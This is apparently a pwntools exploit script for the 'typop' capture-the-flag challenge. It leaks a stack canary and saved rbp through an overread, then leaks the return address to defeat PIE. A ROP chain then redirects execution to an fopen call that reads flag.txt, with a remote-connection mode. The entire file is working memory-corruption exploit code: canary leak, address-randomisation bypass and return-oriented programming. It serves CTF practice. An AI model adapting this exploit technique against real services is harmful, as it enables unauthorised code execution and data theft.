#!/usr/bin/env python3

from pwn import *

ADDR = "typop.chal.idek.team"
PORT = 1337

exe = ELF("./chall_patched")
# libc = ELF("./libc_32.so.6")
# ld = ELF("./ld-2.23.so")

context.binary = exe
# context.log_level = 'DEBUG'

# Split tmux vertically

# There was a bug in pwntools which breaks if using this
# Update pwntools if it is a issue: pip install -U pwntools
context.terminal = ["tmux", "splitw", "-h"]

# GDB init script
gs = '''
b *getFeedback+199
b *fgets+149
b *win+113
continue
'''

def conn():
    if args.GDB:
        # Open gdb in another tmux panel
        r = process([exe.path])
        gdb.attach(r, gdbscript=gs)

    if args.REMOTE:
        # Connect to remote session
        r = remote(ADDR, PORT)
    else:
        r = process([exe.path])
    return r

offset_to_canary = 10
offset_to_ret = 25


def main():
    r = conn()
    r.recvuntil(b"Do you want to complete a survey?")
    r.sendline(b"y")
    r.recvuntil("Do you like ctf?\n")
    r.sendline(b'a'*offset_to_canary)
    r.recvline() # recv input to new line
    leak = r.recvline()
    canary = int.from_bytes(b'\x00' + leak[:7], 'little')
    rbp = int.from_bytes(leak[7:13], 'little')

    print(f'rbp:          {hex(rbp)}')
    print(f'canary:       {hex(canary)}')

    r.recvuntil(b'Aww :( Can you provide some extra feedback?')
    r.sendline(b'a' * offset_to_canary + p64(canary))

    # getFeedback gets called a second time
    r.recvuntil(b"Do you want to complete a survey?")
    r.sendline(b"y")
    r.recvuntil("Do you like ctf?\n")
    # leak return address to main
    r.sendline(b'a' * offset_to_ret)
    r.recvline() # recv input to new line
    ret_leak = int.from_bytes(r.recvline()[:6], 'little')

    exe.address = ret_leak - 0x1447

    print(f'base address: {hex(exe.address)}')
    fopen = p64(exe.address + 0x12ba)

    pop_rdi = p64(exe.address + 0x14d3)
    pop_rsi_r15 = p64(exe.address + 0x14d1)
    read_mode_str = p64(exe.address + 0x2008)
    r.sendline(b'a' * offset_to_canary + p64(canary)
               # Overwrite rbp
               # Set offset big enough so fgets does not fuck up the stack
               + p64(rbp - 0x100)
               # ROP Chain
               # pop pointer to 'flag.txt' string into rdi
               + pop_rdi + p64(rbp+0x28)
               # pop pointer to 'r' string into rsi
               + pop_rsi_r15 + read_mode_str + p64(0xdeadbeef)
               # return directly to fopen call in win function
               + fopen
               # filename string which will be used for fopen
               + b'flag.txt\x00\x00')
    r.recvline()
    flag = r.recvline()
    print(f'FLAG: {flag}' )
    r.interactive()


if __name__ == "__main__":
    main()
